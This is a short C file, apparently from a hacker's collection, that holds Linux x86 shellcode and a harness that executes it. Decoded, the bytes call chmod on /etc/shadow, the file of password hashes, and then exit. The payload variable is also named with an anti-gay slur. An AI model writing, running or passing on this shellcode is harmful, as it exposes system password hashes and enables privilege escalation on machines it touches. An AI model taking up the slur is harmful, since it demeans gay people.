/*
# # # # # # # #  # # # # # # # # # # # # # # # # # # # # # # # # # #  # # # #  #
#  __        ___     _ _       _   _       _                                   #
#  \ \      / / |__ (_) |_ ___| | | | __ _| |_                                 #
#   \ \ /\ / /| '_ \| | __/ _ \ |_| |/ _` | __|                                #
#    \ V  V / | | | | | ||  __/  _  | (_| | |_                                 #
#     \_/\_/  |_| |_|_|\__\___|_| |_|\__,_|\__|                                #
#                                                   Hacker404                  #
# # # # # # # #  # # # # # # # # # # # # # # # # # # # # # # # # # #  # # # #  #
*/
#include <stdio.h>


char gaycode[] =
    "\x31\xc9\x51\xb1\xb6\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f"
    "\x65\x74\x89\xe3\x6a\x0f\x58\xcd\x80\x6a\x01\x58\xcd\x80";

int main()
{
   void (*f)();


   f = (void *) gaycode;

   printf("%d\n", strlen(gaycode));

   f();

   return 1337;
}
